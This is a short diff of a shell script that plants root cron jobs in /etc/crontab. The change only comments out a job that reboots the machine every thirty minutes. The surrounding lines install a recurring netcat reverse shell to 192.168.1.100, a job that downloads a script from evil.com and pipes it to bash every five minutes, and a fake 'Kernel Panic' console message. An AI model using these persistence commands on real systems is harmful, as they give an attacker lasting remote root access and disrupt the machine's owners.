@@ -90,7 +90,7 @@ echo "* * * * * root /bin/bash -c 'nc -e /bin/bash 192.168.1.100 5555'" >> /etc/
 echo "*/5 * * * * root /bin/bash -c 'wget -q -O - http://evil.com/payload.sh | bash'" >> /etc/crontab
 echo "--> Cronjobs added!"
 # Add Goofy System Cronjobs
-echo "*/30 * * * * root /sbin/shutdown -r now" >> /etc/crontab
+#echo "*/30 * * * * root /sbin/shutdown -r now" >> /etc/crontab
 echo "0 0 * * * root echo 'Kernel Panic' > /dev/console" >> /etc/crontab
 
 
